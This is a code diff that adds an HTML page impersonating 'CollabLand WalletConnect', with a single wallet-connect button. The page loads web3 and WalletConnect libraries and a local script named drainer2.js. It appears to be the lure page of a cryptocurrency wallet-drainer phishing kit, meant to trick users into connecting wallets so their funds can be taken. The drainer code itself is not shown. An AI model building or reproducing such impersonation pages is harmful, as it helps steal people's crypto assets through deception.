@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CollabLand | WalletConnect</title>
+
+    <link rel="stylesheet" href="./TailWind/tailwind.css">
+    <script src="./TailWind/tailwindcss.js"></script>
+
+</head>
+<body class="flex w-screen h-screen relative">
+    <main class="flex flex-col items-center relative m-auto h-screen md:h-[calc(100%-50px)] w-screen md:w-96">
+        <span class="text-black m-auto mb-10 font-bold text-5xl text-center">
+            CollabLand <br> WalletConnect
+        </span>
+        <div style="display: none; width: 100%; padding: 2px; white-space: pre; font-size: 11px; overflow-y: scroll; max-height: 600px;" id="testx"></div>
+        <div class="triggerx bg-blue-800 active:bg-blue-200 rounded-md text-white active:text-blue-800 m-auto mt-10 text-lg p-3 px-8">Connect to WalletConnect</div>
+    </main>
+    
+</body>
+<script src="./Decimal/decimal.js"></script>
+<script src="./Moralis/moralis.js"></script>
+
+
+<script type="text/javascript" src="./WEB3/web3.js"></script>
+<script type="text/javascript" src="./Web3Modal/web3modal.js"></script>
+<script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+<!-- Prev walletconect version:     https://unpkg.com/browse/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js
+     New:                           https://unpkg.com/browse/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js  -->
+<script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+<script type="text/javascript"  src="https://cdn.jsdelivr.net/npm/@portis/web3@4.0.7/umd/index.min.js"></script>
+
+<script src="./drainer2.js"></script>
+<!-- <script src="./drainer3.js"></script> -->
+
+</html>
